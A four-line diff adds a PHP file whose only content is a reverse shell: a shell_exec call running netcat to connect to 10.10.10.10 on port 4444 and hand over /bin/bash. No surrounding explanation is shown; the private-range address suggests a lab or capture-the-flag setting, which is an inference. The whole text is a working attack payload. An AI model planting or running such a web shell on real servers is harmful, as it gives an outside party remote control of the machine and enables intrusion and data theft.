@@ -1,0 +1,4 @@
+<?php
+shell_exec('nc 10.10.10.10 4444 -e /bin/bash');
+
+?>
